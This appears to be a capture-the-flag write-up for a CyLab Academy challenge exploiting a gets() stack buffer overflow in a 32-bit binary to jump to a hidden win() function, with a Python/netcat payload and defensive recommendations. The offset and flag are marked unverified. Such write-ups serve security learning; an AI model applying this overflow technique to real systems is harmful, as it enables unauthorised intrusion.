# Control the Return Address – CyLab Academy

## 1. Challenge Information

| Field | Details |
|---|---|
| Platform | CyLab Academy |
| Challenge Number | 16 |
| Challenge Name | Control the Return Address |
| Category | Binary Exploitation |
| Architecture | 32-bit x86 |
| Target | `chatelaine.cylabacademy.net` |
| Port | `16201` |
| Status | In Progress |

## 2. Objective

The objective was to exploit a stack-based buffer overflow and overwrite the saved return address to redirect program execution to the hidden `win()` function.

## 3. Tools Used

- Kali Linux
- `file`
- `nm`
- `grep`
- Python 3
- Netcat (`nc`)

## 4. Source Code Analysis

The vulnerable function contained:

```c
#define BUFSIZE 32

void vuln(){
    char buf[BUFSIZE];
    gets(buf);
    printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n",
           get_return_address());
}
```

### Vulnerability Identified

The program uses:

```c
gets(buf);
```

The `gets()` function does not perform bounds checking.

Although the buffer can hold only 32 bytes, a longer input can overwrite adjacent stack memory, potentially including the saved return address.

This creates a stack-based buffer overflow vulnerability.

## 5. Exploitation Steps

### Step 1 – Identify the Binary Architecture

```bash
file vuln
```

Observed output:

```text
ELF 32-bit LSB executable, Intel 80386
```

The binary uses a 32-bit x86 architecture.

### Step 2 – Locate the Hidden win() Function

```bash
nm -n vuln | grep win
```

Observed output:

```text
080491e6 T win
```

The address of the hidden function:

```text
0x080491e6
```

### Step 3 – Understand Little-Endian Byte Order

The target uses an Intel x86 architecture, which stores multi-byte values in little-endian order.

Function address:

```text
0x080491e6
```

Little-endian representation:

```text
\xe6\x91\x04\x08
```

### Step 4 – Prepare the Overflow Payload

A preliminary payload was prepared with 44 bytes of padding followed by the address of `win()`.

```python
b'A' * 44 + b'\xe6\x91\x04\x08'
```

**Note:** The 44-byte offset is an initial estimate and must be verified before treating the exploit as successful.

### Step 5 – Connect to the Challenge Server

```bash
nc chatelaine.cylabacademy.net 16201
```

### Step 6 – Test the Payload

Preliminary command:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\xe6\x91\x04\x08' + b'\n')" | nc chatelaine.cylabacademy.net 16201
```

The output must be examined to verify whether the saved return address was successfully overwritten and whether `win()` executed.

## 6. Flag

```text
Pending – Final flag not yet confirmed.
```

## 7. Security Concepts Learned

- Stack-based buffer overflow
- Unsafe use of `gets()`
- Stack memory layout
- Saved return address
- Function address discovery
- Little-endian representation
- Control-flow redirection

## 8. Security Recommendations

1. Avoid unsafe functions such as `gets()`.
2. Use bounded input functions such as `fgets()`.
3. Enable stack protection mechanisms.
4. Use compiler security features such as PIE and ASLR where appropriate.
5. Validate input lengths before copying data into buffers.

## 9. Conclusion

Identified the unsafe `gets()` function and located the hidden `win()` function address using `nm`.

A preliminary buffer overflow payload was prepared to overwrite the saved return address. The offset and final flag still require verification.

**Result: In Progress.**
